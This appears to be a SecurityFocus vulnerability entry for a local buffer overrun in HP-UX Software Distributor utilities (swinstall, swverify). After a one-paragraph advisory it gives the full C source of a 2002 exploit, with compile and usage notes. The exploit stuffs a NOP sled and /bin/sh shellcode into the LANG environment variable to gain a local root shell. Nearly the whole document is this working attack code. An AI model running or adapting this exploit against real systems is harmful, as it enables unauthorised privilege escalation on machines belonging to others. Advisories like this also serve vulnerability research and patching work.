source: http://www.securityfocus.com/bid/8986/info

HP has reported that some Software Distributor (SD) utilities are prone to a locally exploitable buffer-overrun vulnerability. Affected utilities include swinstall(1M) and swverify(1M). 

/*
  Program : x_hpux_11i_sw.c
  Use     : HP-UX 11.11/11.0 exploit swxxx to get local root shell.
  Complie : cc x_hpux_11i_sw.c -o x_sw ;./x_sw  ( not use gcc for some system)
  Usage   : ./x_sw [ off ]
  Tested  : HP-UX B11.11 & HP-UX B11.0
  Author  : watercloud [@] xfocus.org
  Date    : 2002-12-11
  Note    : Use as your own risk !!
*/
#include<stdio.h>
#define T_LEN  2124
#define BUFF_LEN 1688
#define NOP 0x0b390280
char shellcode[]=
  "\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08" 
  "\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
  "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16"
  "/bin/shA";

long addr;
char buffer_env[2496];
char buffer[T_LEN];

void main(argc,argv)
int argc;
char ** argv;
{
    int addr_off = 8208 ;
    long addr_e = 0;
    int  n=BUFF_LEN/4,i=0;
    long * ap = (long *) &buffer[BUFF_LEN];
    char * sp = &buffer[BUFF_LEN-strlen(shellcode)];
    long * np = (long *) buffer;
    if(argc >0)

    	addr_off += atoi(argv[1]);
    addr = ( (long) &addr_off +addr_off) /4 * 4  +4;
    for(i=0;i<n;np[i++]=NOP);
    memcpy(sp,shellcode,strlen(shellcode));
    for(i=0;i<(T_LEN-BUFF_LEN)/4;ap[i++]=addr);
    buffer[T_LEN -2 ] += 1; buffer[T_LEN - 1 ] = '\0';
    sprintf(buffer_env,"LANG=AAA%s",buffer);
    putenv(buffer_env);
    execl("/usr/sbin/swinstall","swinstall","/tmp/null",NULL);
	/* if  false ,test swverify. */
    execl("/usr/sbin/swverify","swverify",NULL);
}
